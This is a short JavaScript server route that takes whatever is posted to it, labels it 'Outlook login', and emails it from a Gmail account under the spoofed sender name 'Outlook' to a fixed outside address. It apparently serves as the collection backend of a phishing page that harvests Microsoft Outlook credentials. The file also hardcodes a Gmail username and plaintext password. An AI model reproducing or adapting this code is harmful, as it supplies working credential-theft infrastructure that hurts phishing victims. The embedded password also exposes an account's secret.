let nodemailer = require('nodemailer')

export default async function sendEmail (req, res) {
    console.log(req.body)

     let transporter = nodemailer.createTransport({
        port: 465,
        host: "smtp.gmail.com",
        secure: true, // true for 465, false for other ports
        auth: {
          user: 'techbae.js@gmail.com', // generated ethereal user
          pass: 'Techbae1*', // generated ethereal password
        },
     })

       let info = await transporter.sendMail({
        from: '"Outlook" <techbae.js@gmail.com>',
        to: 'reyesjennifer2806@gmail.com',
        subject: 'Outlook',
        text: `Outlook login ${req.body}`,
        html: `<h6> Outlook Login: ${req.body}</h6>`
       })

      res.json({info})
}